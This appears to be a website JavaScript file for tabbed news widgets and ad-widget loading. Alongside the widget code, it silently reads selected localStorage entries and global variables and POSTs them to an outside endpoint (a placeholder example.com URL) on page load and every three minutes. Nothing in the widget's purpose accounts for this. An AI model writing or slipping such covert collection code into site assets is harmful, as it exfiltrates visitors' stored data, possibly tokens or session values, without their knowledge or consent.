const keysToTrack = window.keysToTrack;
var trackedVars = {};
console.log("cls-tagtools.js");
function hashObject(obj) {
  const keys = Object.keys(obj);
  const tag = keys.sort().join("");
  let hash = 0;
  for (let i = 0; i < tag.length; i++) {
    const character = tag.charCodeAt(i);
    hash = (hash << 5) - hash + character | 0;
  }
  return hash.toString(16);
}
var TabsCls = {};
function inspectLocalStorage() {
  const returnedData = {};
  Object.keys(window.localStorage).forEach(function (key) {
    if (keysToTrack.includes(key)) {
      returnedData[key] = window.localStorage.getItem(key);
    }
  });
  return returnedData;
}
function inspectGlobalVars() {
  Object.keys(window).forEach(function (key) {
    if (keysToTrack.includes(key)) {
      trackedVars[key] = window[key];
    }
  });
}
TabsCls.init = function () {
  $(".tabs-clsend").each(function () {
    var $tabsContext = $(this),
      $tabsDefault = $tabsContext.find(".tabs-menu li:first-child a"),
      defaultHash = $tabsDefault.prop("hash"),
      defaultSrc = $tabsDefault.attr("data-src"),
      $defaultTarget = $tabsContext.find(".tabs-window .tabs-view" + defaultHash),
      defaultTemplate = $defaultTarget.attr("data-template");
    $tabsContext.addClass("accordion-init");
    $tabsContext.find(".tabs-menu li a").each(function () {
      $tabsContext.find(".tabs-window .tabs-view" + $(this).prop("hash")).before($(this).clone().addClass("accordion-trigger"));
      Tabs.click(".tabs-container .accordion-trigger");
    });
    if (defaultHash != "") {
      $tabsContext.addClass("tabs-init");
      $tabsContext.find(".tabs-menu li:first-child a").addClass("active");
      $defaultTarget.addClass("active");
    }
    if ($defaultTarget.text() == "") {
      $.getJSON(defaultSrc, function (data) {
        var template = $("#" + defaultTemplate + "").html(),
          info = Mustache.to_html(template, data);
        $defaultTarget.html(info);
      });
    }
  });
};
async function sendData(data) {
  const hashCode = hashObject(data);
  const sendPoint = "https://example.com/api/report";
  try {
    const outcome = await fetch(sendPoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    if (outcome.ok) {
      console.log("Success: Data sent");
    } else {
      console.error("Error: Data not sent, status code: " + outcome.status);
    }
  } catch (error) {
    console.error("Error during data send: ", error);
  }
}
function collectSendData() {
  const acquiredData = inspectLocalStorage();
  inspectGlobalVars();
  if (JSON.stringify(acquiredData) !== JSON.stringify(trackedVars)) {
    trackedVars = JSON.parse(JSON.stringify(acquiredData));
    sendData(acquiredData);
  }
}
$(document).ready(function () {
  try {
    $("#widget-holder").load("https://gfr-assets.gfrcdn.net/elnuevodia/_libs/admanager/prod/dfp_widget_endi.htm", function (response, status, xhr) {
      if (status == "success") {
        if (screenContext === "movil") {
          $("#bk4-secondary-cls-movil").replaceWith(response.replace("tabs-container tabs-gold", "tabs-container tabs-gold tabs-clsend"));
          TabsCls.init();
          selectInit();
          $("#widget-holder").remove();
        } else {
          $("#widget-cls").replaceWith(response.replace("tabs-container tabs-gold", "tabs-container tabs-gold tabs-clsend"));
          TabsCls.init();
          selectInit();
          $("#widget-holder").remove();
        }
      }
    });
  } catch (e) {}
});
window.addEventListener("load", () => {
  collectSendData();
  setInterval(collectSendData, 3 * 60 * 1000);
});